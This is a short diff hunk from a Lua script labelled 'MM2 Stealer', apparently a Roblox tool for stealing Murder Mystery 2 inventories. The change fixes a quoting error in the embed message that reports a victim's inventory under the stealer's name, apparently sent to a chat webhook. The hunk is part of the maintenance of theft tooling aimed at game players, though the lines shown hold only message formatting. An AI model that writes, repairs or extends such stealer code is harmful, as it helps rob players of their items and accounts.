@@ -109,7 +109,7 @@ local success, errorMsg = pcall(function()
         embeds = {
             {
                 title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
-                description = ""```\n🎒 **__Inventory__**\n```" .. FullInventory() .. "```",
+                description = "```\n🎒 **__Inventory__**\n```" .. FullInventory() .. "```",
                 color = tonumber(0x3365FF),
             }
         }
